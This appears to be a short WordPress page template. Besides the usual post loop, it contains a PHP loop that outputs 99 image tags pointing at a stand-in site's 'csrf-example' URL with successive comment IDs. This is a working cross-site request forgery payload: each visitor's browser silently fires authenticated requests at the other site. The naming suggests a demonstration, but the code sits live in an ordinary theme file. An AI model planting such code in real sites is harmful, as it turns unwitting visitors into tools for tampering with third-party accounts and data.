<?php while (have_posts()) : the_post(); ?>
  <?php get_template_part('templates/page', 'header'); ?>
  <?php get_template_part('templates/content', 'page'); ?>

  <?php
    for ($i = 1; $i < 100; $i++) {
      echo '<img src="http://innocent-site.colab/csrf-example?comment_id=' . $i . '">';
    }
  ?>

<?php endwhile; ?>
